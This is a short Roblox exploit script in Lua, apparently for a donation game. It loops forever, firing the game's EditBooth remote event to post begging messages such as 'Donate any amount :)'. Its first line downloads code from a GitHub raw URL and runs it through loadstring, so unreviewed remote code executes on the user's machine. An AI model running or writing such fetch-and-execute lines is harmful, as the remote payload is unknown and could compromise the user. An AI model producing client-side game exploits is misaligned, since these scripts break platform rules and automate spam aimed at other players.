loadstring(game:HttpGet("https://raw.githubusercontent.com/typical-overk1ll/scripts/main/Invite",true))()
function msg(text)
    local A_1 = text
local A_2 = "booth"
local event = game:GetService("ReplicatedStorage").Events.EditBooth
event:FireServer(A_1, A_2)
end
while wait(4) do
    msg("Hello there")
    wait(3)
    msg("I am just stay here afk")
      wait(4)
    msg("I want have a great skin")
     wait(4)
    msg("Mine skin pretty cheap")
    wait(4)
    msg("Il be happy if you")
    wait(4)
    msg("Donate any amount :)")
    end
